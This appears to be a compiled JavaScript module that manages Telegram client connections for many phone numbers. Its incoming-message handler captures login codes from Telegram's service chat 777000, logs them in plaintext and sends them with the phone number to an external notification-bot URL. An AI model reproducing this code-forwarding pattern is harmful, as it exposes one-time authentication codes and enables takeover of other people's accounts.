"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.createClient = createClient;
exports.destroyClient = destroyClient;
exports.handleClientError = handleClientError;
exports.handleIncomingEvent = handleIncomingEvent;
const telegram_1 = require("telegram");
const events_1 = require("telegram/events");
const Logger_1 = require("telegram/extensions/Logger");
const Helpers_1 = require("telegram/Helpers");
const utils_1 = require("../../../utils");
const parseError_1 = require("../../../utils/parseError");
const fetchWithTimeout_1 = require("../../../utils/fetchWithTimeout");
const logbots_1 = require("../../../utils/logbots");
const generateTGConfig_1 = require("../utils/generateTGConfig");
const withTimeout_1 = require("../../../utils/withTimeout");
const connection_manager_1 = require("../utils/connection-manager");
async function createClient(ctx, session, handler = true, handlerFn) {
    const tgCreds = await (0, utils_1.getCredentialsForMobile)(ctx.phoneNumber);
    const apiHash = tgCreds.apiHash;
    const apiId = tgCreds.apiId;
    const tgConfiguration = await (0, generateTGConfig_1.generateTGConfig)(ctx.phoneNumber);
    let client = null;
    try {
        await (0, withTimeout_1.withTimeout)(async () => {
            client = new telegram_1.TelegramClient(session, apiId, apiHash, tgConfiguration);
            client.setLogLevel(Logger_1.LogLevel.ERROR);
            client._errorHandler = async (error) => { handleClientError(ctx, error); };
            await client.connect();
            ctx.logger.info(ctx.phoneNumber, 'Connected Client Succesfully');
        }, {
            timeout: 180000,
            errorMessage: `[Tg Manager]\n${ctx.phoneNumber}: Client Creation TimeOut\n`,
        });
        if (!client) {
            throw new Error(`Client is null after connection attempt for ${ctx.phoneNumber}`);
        }
        if (handler && client) {
            if (handlerFn) {
                ctx.logger.info(ctx.phoneNumber, 'Adding Custom Event Handler');
                client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                ctx.logger.info(ctx.phoneNumber, 'Adding Default Event Handler');
                client.addEventHandler(async (event) => { await handleIncomingEvent(ctx, event); }, new events_1.NewMessage());
            }
            if (!client.connected) {
                throw new Error(`Client not connected after connection attempt for ${ctx.phoneNumber}`);
            }
        }
        return client;
    }
    catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Client creation failed', error);
        if (client) {
            try {
                await client.destroy();
            }
            catch (destroyError) {
                ctx.logger.error(ctx.phoneNumber, 'Error destroying failed client', destroyError);
            }
        }
        throw error;
    }
}
async function destroyClient(ctx, session) {
    if (ctx.client) {
        try {
            ctx.client._errorHandler = null;
            await ctx.client?.destroy();
            ctx.client._eventBuilders = [];
            session?.delete();
            await (0, Helpers_1.sleep)(2000);
            ctx.logger.info(ctx.phoneNumber, 'Client Disconnected Sucessfully');
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `${ctx.phoneNumber}: Error during client cleanup`);
        }
        finally {
            if (ctx.client) {
                ctx.client._destroyed = true;
                if (ctx.client._sender && typeof ctx.client._sender.disconnect === 'function') {
                    await ctx.client._sender.disconnect();
                }
            }
        }
    }
}
function handleClientError(ctx, error) {
    const { contains } = require('../../../utils');
    const errorDetails = (0, parseError_1.parseError)(error, `${ctx.phoneNumber}: RPC Error`, false);
    if ((error.message && error.message == 'TIMEOUT') || contains(errorDetails.message, ['ETIMEDOUT'])) {
        ctx.logger.error(ctx.phoneNumber, `Timeout error occurred for ${ctx.phoneNumber}`, error);
        return setTimeout(async () => {
            if (ctx.client && !ctx.client.connected) {
                ctx.logger.debug(ctx.phoneNumber, 'disconnecting client Connection Manually');
                await (0, connection_manager_1.unregisterClient)(ctx.phoneNumber);
            }
            else if (ctx.client) {
                ctx.logger.debug(ctx.phoneNumber, 'Client Connected after Retry');
            }
            else {
                ctx.logger.debug(ctx.phoneNumber, 'Client does not exist');
            }
        }, 10000);
    }
    return null;
}
async function handleIncomingEvent(ctx, event) {
    if (event.isPrivate) {
        if (event.message.chatId.toString() == '777000') {
            ctx.logger.info(ctx.phoneNumber, event.message.text.toLowerCase());
            ctx.logger.info(ctx.phoneNumber, `Login Code received for - ${ctx.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
            ctx.logger.info(ctx.phoneNumber, 'Date :', new Date(event.message.date * 1000));
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${ctx.phoneNumber}\n${event.message.text}`)}`);
        }
    }
}
//# sourceMappingURL=client-operations.js.map